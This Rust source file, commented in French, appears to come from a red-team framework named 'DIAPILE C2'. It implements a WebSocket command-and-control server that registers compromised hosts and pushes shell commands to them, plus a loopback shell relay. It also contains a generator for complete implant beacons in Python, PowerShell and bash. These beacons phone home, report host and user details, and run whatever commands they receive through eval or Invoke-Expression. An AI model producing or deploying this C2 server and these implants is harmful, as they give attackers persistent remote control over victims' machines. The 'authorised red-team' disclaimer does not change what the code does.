//! DIAPILE C2 — WebSocket C2 Server (bidirectionnel, push de tâches)
//!
//! Contrairement au HTTP polling (agent tire les tâches toutes les N secondes),
//! le WS C2 maintient une connexion persistante :
//!   - Serveur POUSSE les tâches immédiatement
//!   - Agent RÉPOND avec les résultats en temps réel
//!   - Latence réduite de N*sleep_seconds → ~50ms
//!
//! Implémenté sans crate externe (tokio + sha1 + base64 déjà présents).
//! Protocol : frames WebSocket TEXT JSON.
//!
//! Format des messages :
//!   → Agent vers C2 : { "type": "checkin"|"result"|"ping", ...data }
//!   → C2 vers Agent : { "type": "task"|"config"|"kill", ...data }
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
#![allow(dead_code)]

use super::agent::{Agent, AgentConfig, AgentStatus, C2Server, Task, TaskResult, TaskStatus};
use base64::Engine;
use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{broadcast, Mutex, RwLock};
use tokio::time::{timeout, Duration};

// ─────────────────────────────────────────────────────────────────────────────
// Types WS C2
// ─────────────────────────────────────────────────────────────────────────────

/// Message envoyé par l'agent vers le C2
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum AgentMessage {
    /// Premier message — enregistrement de l'agent
    Checkin {
        id: String,
        hostname: String,
        username: String,
        os: String,
        ip: String,
        arch: String,
        pid: u32,
        sleep: u64,
        jitter: f64,
    },
    /// Résultat d'une tâche exécutée
    Result {
        task_id: String,
        output: String,
        error: Option<String>,
    },
    /// Keepalive — évite le timeout
    Ping { ts: String },
    /// Agent demande ses tâches en attente (fallback si push manqué)
    GetTasks { agent_id: String },
}

/// Message envoyé par le C2 vers l'agent
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum C2Message {
    /// Accusé de réception du checkin
    CheckinAck {
        agent_id: String,
        sleep: u64,
        jitter: f64,
    },
    /// Tâche à exécuter
    Task {
        task_id: String,
        command: String,
        timeout: u64,
    },
    /// Modifier la configuration sleep/jitter de l'agent
    Config { sleep: u64, jitter: f64 },
    /// Terminer l'agent proprement
    Kill { reason: String },
    /// Pas de tâche en attente
    Idle,
}

// ─────────────────────────────────────────────────────────────────────────────
// WsC2Server
// ─────────────────────────────────────────────────────────────────────────────

/// Map de task_sender par agent_id pour pousser les tâches en temps réel
type AgentSenders = Arc<RwLock<HashMap<String, broadcast::Sender<C2Message>>>>;

pub struct WsC2Server {
    pub server: Arc<C2Server>,
    senders: AgentSenders,
}

impl WsC2Server {
    pub fn new(server: Arc<C2Server>) -> Self {
        Self {
            server,
            senders: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    /// Lance le serveur WebSocket C2
    pub async fn start(
        &self,
        bind_addr: &str,
        bind_port: u16,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let addr = format!("{}:{}", bind_addr, bind_port);
        let listener = TcpListener::bind(&addr).await?;

        println!(
            "\n  \x1b[38;5;196m[WS-C2]\x1b[0m Serveur WebSocket C2 sur \x1b[33mws://{}\x1b[0m",
            addr
        );
        println!("  \x1b[90mProtocole : diapile-c2 | Format : JSON text frames\x1b[0m\n");

        let srv = self.server.clone();
        let senders = self.senders.clone();

        loop {
            let (stream, peer) = listener.accept().await?;
            let srv_c = srv.clone();
            let senders_c = senders.clone();

            tokio::spawn(async move {
                if let Err(e) = handle_ws_c2_connection(stream, peer, srv_c, senders_c).await {
                    eprintln!("  [WS-C2] Connexion {} fermée: {}", peer, e);
                }
            });
        }
    }

    /// Pousse une tâche immédiatement à un agent connecté (sans attendre son polling)
    pub async fn push_task(&self, agent_id: &str, command: &str) -> Result<String, String> {
        let task_id = format!("wstask-{}", uuid_nano());

        // Enregistrer la tâche dans C2Server
        self.server
            .queue_task(agent_id, command)
            .await
            .ok_or(format!("Agent {} non trouvé", agent_id))?;

        // Pousser directement via le canal WS si l'agent est connecté
        let senders = self.senders.read().await;
        if let Some(tx) = senders.get(agent_id) {
            let msg = C2Message::Task {
                task_id: task_id.clone(),
                command: command.to_string(),
                timeout: 30,
            };
            let _ = tx.send(msg);
            println!(
                "  \x1b[32m[WS-C2]\x1b[0m Task POUSSÉE immédiatement → agent {}",
                &agent_id[..8.min(agent_id.len())]
            );
        } else {
            println!(
                "  \x1b[33m[WS-C2]\x1b[0m Agent {} hors-ligne — tâche en attente",
                &agent_id[..8.min(agent_id.len())]
            );
        }

        Ok(task_id)
    }

    /// Liste les agents connectés en WS
    pub async fn connected_agents(&self) -> Vec<String> {
        self.senders.read().await.keys().cloned().collect()
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Gestionnaire de connexion WS C2
// ─────────────────────────────────────────────────────────────────────────────

async fn handle_ws_c2_connection(
    stream: TcpStream,
    peer: SocketAddr,
    server: Arc<C2Server>,
    senders: AgentSenders,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // 1. Handshake HTTP → WebSocket
    let (mut writer, mut reader_buf) = ws_handshake(stream, "diapile-c2").await?;
    let mut agent_id: Option<String> = None;

    // Créer le canal broadcast pour pousser les tâches à cet agent
    let (tx, mut rx) = broadcast::channel::<C2Message>(64);

    println!(
        "  \x1b[32m[WS-C2]\x1b[0m Connexion WebSocket depuis {}",
        peer
    );

    // 2. Boucle principale — lire messages de l'agent ET pousser tâches
    loop {
        tokio::select! {
            // ── Réception message agent ──────────────────────────────────────
            frame_result = read_ws_frame(&mut reader_buf) => {
                match frame_result {
                    Ok(Some(text)) => {
                        match serde_json::from_str::<AgentMessage>(&text) {
                            Ok(msg) => {
                                let response = process_agent_message(
                                    msg, peer, &server, &senders, &tx, &mut agent_id
                                ).await;
                                if let Some(resp) = response {
                                    let json = serde_json::to_string(&resp)?;
                                    write_ws_frame(&mut writer, &json).await?;
                                }
                            }
                            Err(e) => eprintln!("  [WS-C2] JSON invalide de {}: {}", peer, e),
                        }
                    }
                    Ok(None) => {
                        // Connexion fermée proprement
                        break;
                    }
                    Err(e) => {
                        eprintln!("  [WS-C2] Read error {}: {}", peer, e);
                        break;
                    }
                }
            }

            // ── Push tâche vers l'agent ───────────────────────────────────────
            task_result = rx.recv() => {
                match task_result {
                    Ok(msg) => {
                        let json = serde_json::to_string(&msg)?;
                        if write_ws_frame(&mut writer, &json).await.is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        }
    }

    // Nettoyage : retirer l'agent des senders
    if let Some(id) = &agent_id {
        senders.write().await.remove(id);
        server.kill_agent(id).await;
        println!(
            "  \x1b[31m[WS-C2]\x1b[0m Agent {} déconnecté",
            &id[..8.min(id.len())]
        );
    }

    Ok(())
}

async fn process_agent_message(
    msg: AgentMessage,
    peer: SocketAddr,
    server: &Arc<C2Server>,
    senders: &AgentSenders,
    tx: &broadcast::Sender<C2Message>,
    agent_id: &mut Option<String>,
) -> Option<C2Message> {
    match msg {
        AgentMessage::Checkin {
            id,
            hostname,
            username,
            os,
            ip,
            arch,
            pid,
            sleep,
            jitter,
        } => {
            // Enregistrer l'agent
            let agent = Agent {
                id: id.clone(),
                hostname: hostname.clone(),
                username: username.clone(),
                os: os.clone(),
                ip: ip.clone(),
                arch: arch.clone(),
                pid,
                status: AgentStatus::Active,
                config: AgentConfig {
                    sleep_seconds: sleep,
                    jitter,
                    ..Default::default()
                },
                first_seen: Utc::now().to_rfc3339(),
                last_checkin: Utc::now().to_rfc3339(),
                tasks: Vec::new(),
                task_results: Vec::new(),
            };
            server.register_agent(agent).await;

            // Stocker le sender pour push
            senders.write().await.insert(id.clone(), tx.clone());
            *agent_id = Some(id.clone());

            // Répondre avec l'accusé de réception
            Some(C2Message::CheckinAck {
                agent_id: id,
                sleep,
                jitter,
            })
        }

        AgentMessage::Result {
            task_id,
            output,
            error,
        } => {
            if let Some(id) = agent_id {
                let result = TaskResult {
                    task_id: task_id.clone(),
                    output: output.clone(),
                    error: error.clone(),
                    time: Utc::now().to_rfc3339(),
                };
                server.submit_result(id, result).await;
                println!(
                    "  \x1b[32m[WS-C2 RESULT]\x1b[0m agent={} task={} ({} bytes){}",
                    &id[..8.min(id.len())],
                    &task_id[..8.min(task_id.len())],
                    output.len(),
                    error
                        .as_ref()
                        .map(|e| format!(" err={}", e))
                        .unwrap_or_default()
                );
                // Afficher les premiers 200 chars du résultat
                if !output.is_empty() {
                    println!(
                        "  \x1b[90m  → {}\x1b[0m",
                        output.chars().take(200).collect::<String>()
                    );
                }
            }
            None // pas de réponse nécessaire
        }

        AgentMessage::Ping { ts } => {
            // Keepalive — mettre à jour last_seen
            if let Some(id) = agent_id {
                // Vérifier s'il y a des tâches en attente à pousser
                let pending = server.get_pending_tasks(id).await;
                if let Some(task) = pending.first() {
                    return Some(C2Message::Task {
                        task_id: task.id.clone(),
                        command: task.command.clone(),
                        timeout: 30,
                    });
                }
            }
            None
        }

        AgentMessage::GetTasks { agent_id: aid } => {
            let pending = server.get_pending_tasks(&aid).await;
            if let Some(task) = pending.first() {
                Some(C2Message::Task {
                    task_id: task.id.clone(),
                    command: task.command.clone(),
                    timeout: 30,
                })
            } else {
                Some(C2Message::Idle)
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Shell interactif WebSocket (pour opérateur navigateur)
// ─────────────────────────────────────────────────────────────────────────────

/// Lance un serveur WebSocket pour contrôler une session shell depuis le navigateur
pub async fn start_ws_shell_server(
    bind_port: u16,
    session_mgr: Arc<crate::shell::SessionManager>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // Bind uniquement loopback pour la sécurité
    let addr = format!("127.0.0.1:{}", bind_port);
    let listener = TcpListener::bind(&addr).await?;

    println!(
        "\n  \x1b[38;5;196m[WS-SHELL]\x1b[0m Shell WebSocket sur \x1b[33mws://{}/shell\x1b[0m",
        addr
    );
    println!("  \x1b[90mOuvrez dashboard.html → onglet Shell pour interagir\x1b[0m\n");

    loop {
        let (stream, peer) = listener.accept().await?;

        // Sécurité : accepter uniquement les connexions loopback
        if !peer.ip().is_loopback() {
            drop(stream);
            continue;
        }

        let mgr = session_mgr.clone();
        tokio::spawn(async move {
            if let Err(e) = handle_ws_shell_connection(stream, peer, mgr).await {
                eprintln!("  [WS-SHELL] {}: {}", peer, e);
            }
        });
    }
}

async fn handle_ws_shell_connection(
    stream: TcpStream,
    peer: SocketAddr,
    mgr: Arc<crate::shell::SessionManager>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let (mut writer, mut reader) = ws_handshake(stream, "diapile-shell").await?;

    // Envoyer la liste des sessions disponibles
    let sessions = mgr.list().await;
    let sessions_json = serde_json::json!({
        "type": "sessions_list",
        "sessions": sessions.iter().map(|s| serde_json::json!({
            "id": s.id,
            "ip": s.remote_ip,
            "user": s.username,
            "os": s.os,
            "status": format!("{:?}", s.status),
        })).collect::<Vec<_>>()
    });
    write_ws_frame(&mut writer, &serde_json::to_string(&sessions_json)?).await?;

    // Protocole : { "type": "exec", "session_id": N, "command": "..." }
    let mut active_session: Option<usize> = None;

    loop {
        let text = match read_ws_frame(&mut reader).await? {
            Some(t) => t,
            None => break,
        };

        let msg: serde_json::Value = match serde_json::from_str(&text) {
            Ok(v) => v,
            Err(e) => {
                let err = serde_json::json!({"type": "error", "msg": e.to_string()});
                write_ws_frame(&mut writer, &serde_json::to_string(&err)?).await?;
                continue;
            }
        };

        match msg["type"].as_str().unwrap_or("") {
            "select" => {
                if let Some(sid) = msg["session_id"].as_u64() {
                    active_session = Some(sid as usize);
                    let ack = serde_json::json!({"type": "selected", "session_id": sid});
                    write_ws_frame(&mut writer, &serde_json::to_string(&ack)?).await?;
                }
            }
            "exec" => {
                let sid = msg["session_id"]
                    .as_u64()
                    .map(|n| n as usize)
                    .or(active_session);

                let cmd = msg["command"].as_str().unwrap_or("id");

                if let Some(session_id) = sid {
                    match mgr.exec(session_id, cmd, 15).await {
                        Ok(output) => {
                            let resp = serde_json::json!({
                                "type": "output",
                                "session_id": session_id,
                                "command": cmd,
                                "output": output,
                            });
                            write_ws_frame(&mut writer, &serde_json::to_string(&resp)?).await?;
                        }
                        Err(e) => {
                            let err = serde_json::json!({
                                "type": "error",
                                "session_id": session_id,
                                "msg": e,
                            });
                            write_ws_frame(&mut writer, &serde_json::to_string(&err)?).await?;
                        }
                    }
                } else {
                    let err = serde_json::json!({"type": "error", "msg": "No session selected"});
                    write_ws_frame(&mut writer, &serde_json::to_string(&err)?).await?;
                }
            }
            "list_sessions" => {
                let sessions = mgr.list().await;
                let resp = serde_json::json!({
                    "type": "sessions_list",
                    "sessions": sessions.iter().map(|s| serde_json::json!({
                        "id": s.id, "ip": s.remote_ip, "user": s.username,
                    })).collect::<Vec<_>>()
                });
                write_ws_frame(&mut writer, &serde_json::to_string(&resp)?).await?;
            }
            "ping" => {
                let pong = serde_json::json!({"type": "pong", "ts": Utc::now().to_rfc3339()});
                write_ws_frame(&mut writer, &serde_json::to_string(&pong)?).await?;
            }
            other => {
                let err =
                    serde_json::json!({"type": "error", "msg": format!("unknown type: {}", other)});
                write_ws_frame(&mut writer, &serde_json::to_string(&err)?).await?;
            }
        }
    }

    Ok(())
}

// ─────────────────────────────────────────────────────────────────────────────
// WebSocket Handshake & Frame I/O (sans crate externe)
// ─────────────────────────────────────────────────────────────────────────────

type WsWriter = tokio::io::WriteHalf<TcpStream>;
type WsReader = tokio::io::BufReader<tokio::io::ReadHalf<TcpStream>>;

/// Effectue le handshake HTTP → WebSocket RFC 6455
async fn ws_handshake(
    stream: TcpStream,
    protocol: &str,
) -> Result<(WsWriter, WsReader), Box<dyn std::error::Error + Send + Sync>> {
    let (reader_half, writer_half) = tokio::io::split(stream);
    let mut reader = BufReader::new(reader_half);
    let mut writer = writer_half;

    // 1. Lire les headers HTTP
    let mut headers = Vec::new();
    loop {
        let mut line = String::new();
        reader.read_line(&mut line).await?;
        if line == "\r\n" || line == "\n" {
            break;
        }
        headers.push(line.trim().to_string());
        if headers.len() > 50 {
            return Err("Too many headers".into());
        }
    }

    // 2. Extraire Sec-WebSocket-Key
    let ws_key = headers
        .iter()
        .find(|h| h.to_lowercase().starts_with("sec-websocket-key:"))
        .and_then(|h| h.splitn(2, ':').nth(1))
        .map(|v| v.trim().to_string())
        .ok_or("Missing Sec-WebSocket-Key")?;

    // 3. Calculer Sec-WebSocket-Accept = base64(sha1(key + GUID))
    const WS_GUID: &str = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    let accept_input = format!("{}{}", ws_key, WS_GUID);
    let accept_hash = sha1_bytes(accept_input.as_bytes());
    let accept_token = base64::engine::general_purpose::STANDARD.encode(&accept_hash);

    // 4. Envoyer 101 Switching Protocols
    let response = format!(
        "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: {}\r\nSec-WebSocket-Protocol: {}\r\n\r\n",
        accept_token, protocol
    );
    writer.write_all(response.as_bytes()).await?;

    Ok((writer, reader))
}

/// Lit une frame WebSocket TEXT (RFC 6455)
async fn read_ws_frame(
    reader: &mut WsReader,
) -> Result<Option<String>, Box<dyn std::error::Error + Send + Sync>> {
    // Lire 2 octets de header
    let mut header = [0u8; 2];
    match reader.read_exact(&mut header).await {
        Ok(_) => {}
        Err(e) if e.kind() == std::io::ErrorKind::UnexpectedEof => return Ok(None),
        Err(e) => return Err(e.into()),
    }

    let fin = (header[0] & 0x80) != 0;
    let opcode = header[0] & 0x0f;
    let masked = (header[1] & 0x80) != 0;
    let mut len = (header[1] & 0x7f) as u64;

    // Opcode 8 = connexion close
    if opcode == 0x08 {
        return Ok(None);
    }
    // On ne gère que TEXT (1) et CONTINUATION (0)
    if opcode != 0x01 && opcode != 0x00 {
        return Ok(None);
    }

    // Extended length
    if len == 126 {
        let mut ext = [0u8; 2];
        reader.read_exact(&mut ext).await?;
        len = u16::from_be_bytes(ext) as u64;
    } else if len == 127 {
        let mut ext = [0u8; 8];
        reader.read_exact(&mut ext).await?;
        len = u64::from_be_bytes(ext);
    }

    // Masking key (client → serveur est toujours masqué)
    let mask_key = if masked {
        let mut mk = [0u8; 4];
        reader.read_exact(&mut mk).await?;
        Some(mk)
    } else {
        None
    };

    // Payload
    if len > 1024 * 1024 {
        return Err("Frame too large (>1MB)".into());
    }
    let mut payload = vec![0u8; len as usize];
    reader.read_exact(&mut payload).await?;

    // Démasquer
    if let Some(mk) = mask_key {
        for (i, byte) in payload.iter_mut().enumerate() {
            *byte ^= mk[i % 4];
        }
    }

    Ok(Some(String::from_utf8_lossy(&payload).to_string()))
}

/// Écrit une frame WebSocket TEXT vers le client (serveur → client, non masquée)
async fn write_ws_frame(
    writer: &mut WsWriter,
    text: &str,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let payload = text.as_bytes();
    let len = payload.len();

    // FIN=1, opcode=0x01 (TEXT)
    let mut frame = vec![0x81u8];

    if len < 126 {
        frame.push(len as u8);
    } else if len < 65536 {
        frame.push(126);
        frame.extend_from_slice(&(len as u16).to_be_bytes());
    } else {
        frame.push(127);
        frame.extend_from_slice(&(len as u64).to_be_bytes());
    }
    frame.extend_from_slice(payload);
    writer.write_all(&frame).await?;
    Ok(())
}

// ─────────────────────────────────────────────────────────────────────────────
// SHA-1 inline (RFC 3174) — sans dépendance externe
// ─────────────────────────────────────────────────────────────────────────────

fn sha1_bytes(input: &[u8]) -> [u8; 20] {
    // Utiliser la crate sha1 déjà présente dans Cargo.toml
    use sha1::{Digest, Sha1};
    let mut hasher = Sha1::new();
    hasher.update(input);
    let result = hasher.finalize();
    let mut out = [0u8; 20];
    out.copy_from_slice(&result);
    out
}

fn uuid_nano() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let t = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default();
    format!("{:x}", t.as_nanos())
}

// ─────────────────────────────────────────────────────────────────────────────
// Beacon client WS (côté implant/agent)
// ─────────────────────────────────────────────────────────────────────────────

/// Génère le code d'un beacon WebSocket pour différents OS/langages
pub fn generate_ws_beacon(
    c2_host: &str,
    c2_port: u16,
    sleep_secs: u64,
) -> Vec<(&'static str, String)> {
    vec![
        (
            "python3",
            format!(
                r#"
import websocket, json, subprocess, platform, getpass, socket, time, random, os

C2 = "ws://{}:{}"
SLEEP = {}

def checkin(ws):
    ws.send(json.dumps({{
        "type": "checkin",
        "id": hex(hash(socket.gethostname()))[2:],
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": platform.system(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "sleep": SLEEP,
        "jitter": 0.3,
    }}))

def on_message(ws, msg):
    m = json.loads(msg)
    if m.get("type") == "task":
        try:
            out = subprocess.check_output(m["command"], shell=True, stderr=subprocess.STDOUT, timeout=m.get("timeout",30))
            ws.send(json.dumps({{"type":"result","task_id":m["task_id"],"output":out.decode(errors="replace")}}))
        except Exception as e:
            ws.send(json.dumps({{"type":"result","task_id":m["task_id"],"output":"","error":str(e)}}))

def on_open(ws):
    checkin(ws)

while True:
    try:
        ws = websocket.WebSocketApp(C2, subprotocols=["diapile-c2"], on_message=on_message, on_open=on_open)
        ws.run_forever(ping_interval=SLEEP, ping_payload=json.dumps({{"type":"ping","ts":"now"}}))
    except: pass
    time.sleep(SLEEP + random.uniform(0, SLEEP*0.3))
"#,
                c2_host, c2_port, sleep_secs
            ),
        ),
        (
            "powershell",
            format!(
                r#"
$C2 = "ws://{}:{}"
$SLEEP = {}
Add-Type -AssemblyName System.Net.WebSockets
while ($true) {{
    try {{
        $ws = New-Object System.Net.WebSockets.ClientWebSocket
        $ws.Options.AddSubProtocol("diapile-c2")
        $ct = [System.Threading.CancellationToken]::None
        $null = $ws.ConnectAsync([Uri]$C2, $ct).Wait(5000)
        # Checkin
        $info = @{{type="checkin";id=[BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,16);hostname=$env:COMPUTERNAME;username=$env:USERNAME;os="Windows";ip=(Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.ToString();arch=$env:PROCESSOR_ARCHITECTURE;pid=[System.Diagnostics.Process]::GetCurrentProcess().Id;sleep=$SLEEP;jitter=0.3}} | ConvertTo-Json
        $buf = [Text.Encoding]::UTF8.GetBytes($info)
        $null = $ws.SendAsync([ArraySegment[byte]]$buf, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait(3000)
        # Loop
        $rbuf = [byte[]]::new(65536)
        while ($ws.State -eq "Open") {{
            $res = $ws.ReceiveAsync([ArraySegment[byte]]$rbuf, $ct)
            $null = $res.Wait(($SLEEP+1)*1000)
            if ($res.Result.MessageType -eq "Close") {{ break }}
            $msg = [Text.Encoding]::UTF8.GetString($rbuf, 0, $res.Result.Count) | ConvertFrom-Json
            if ($msg.type -eq "task") {{
                try {{ $out = Invoke-Expression $msg.command 2>&1 | Out-String }}
                catch {{ $out = $_.Exception.Message }}
                $reply = @{{type="result";task_id=$msg.task_id;output=$out}} | ConvertTo-Json
                $rbuf2 = [Text.Encoding]::UTF8.GetBytes($reply)
                $null = $ws.SendAsync([ArraySegment[byte]]$rbuf2, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait(3000)
            }}
        }}
    }} catch {{}}
    Start-Sleep -Seconds ($SLEEP + (Get-Random -Max ([int]($SLEEP*0.3))))
}}
"#,
                c2_host, c2_port, sleep_secs
            ),
        ),
        (
            "bash",
            format!(
                r#"
#!/bin/bash
# Beacon WebSocket bash (nécessite websocat ou wscat)
C2="ws://{}:{}"
SLEEP={}
ID=$(hostname | md5sum | head -c 16)

send_checkin() {{
  echo '{{ "type":"checkin","id":"'$ID'","hostname":"'$(hostname)'","username":"'$(whoami)'","os":"Linux","ip":"'$(hostname -I | awk '{{print $1}}')'" ,"arch":"'$(uname -m)'","pid":'$$',"sleep":'$SLEEP',"jitter":0.3 }}'
}}

while true; do
  if command -v websocat &>/dev/null; then
    (send_checkin; while true; do sleep $SLEEP; echo '{{"type":"ping","ts":"now"}}'; done) | \
    websocat "$C2" --protocol diapile-c2 | \
    while read msg; do
      CMD=$(echo "$msg" | python3 -c "import sys,json; m=json.load(sys.stdin); print(m.get('command','') if m.get('type')=='task' else '')" 2>/dev/null)
      TID=$(echo "$msg" | python3 -c "import sys,json; m=json.load(sys.stdin); print(m.get('task_id',''))" 2>/dev/null)
      if [ -n "$CMD" ]; then
        OUT=$(eval "$CMD" 2>&1 | head -100)
        echo '{{"type":"result","task_id":"'$TID'","output":"'$(echo $OUT | sed "s/\"/\\\\"/g")'"}}' | websocat "$C2" --protocol diapile-c2
      fi
    done
  else
    echo "websocat requis: cargo install websocat"
  fi
  sleep $SLEEP
done
"#,
                c2_host, c2_port, sleep_secs
            ),
        ),
    ]
}
